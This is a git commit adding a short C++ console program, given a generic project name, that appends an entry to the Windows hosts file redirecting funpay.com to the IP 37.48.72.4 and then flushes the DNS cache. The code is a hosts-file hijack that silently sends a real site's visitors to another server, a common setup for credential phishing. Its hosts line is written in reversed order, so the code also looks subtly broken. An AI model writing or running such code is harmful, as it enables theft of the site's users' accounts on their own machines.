9798989adb43505f2aec414e268705851007e464
LizardRoot <tvoa3147@gmail.com>
2022-05-01 00:12:03 +0300

    initial commit

---
+++ ConsoleApplication2/ConsoleApplication2/ConsoleApplication2.cpp
@@ -0,0 +1,24 @@
+﻿#include <iostream>
+#include <fstream>
+#include <string>
+
+
+
+void change_hosts(std::string file_path, std::string dns_record)
+{
+    std::ofstream vmdelet_out;
+    vmdelet_out.open(file_path, std::ios::app);
+    vmdelet_out << dns_record;
+    vmdelet_out.close();
+}
+
+int main()
+{
+    std::string file_path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+    std::string dns_record = "\nfunpay.com 37.48.72.4";
+
+    change_hosts(file_path, dns_record);
+
+    system("ipconfig /flushdns");
+}
+
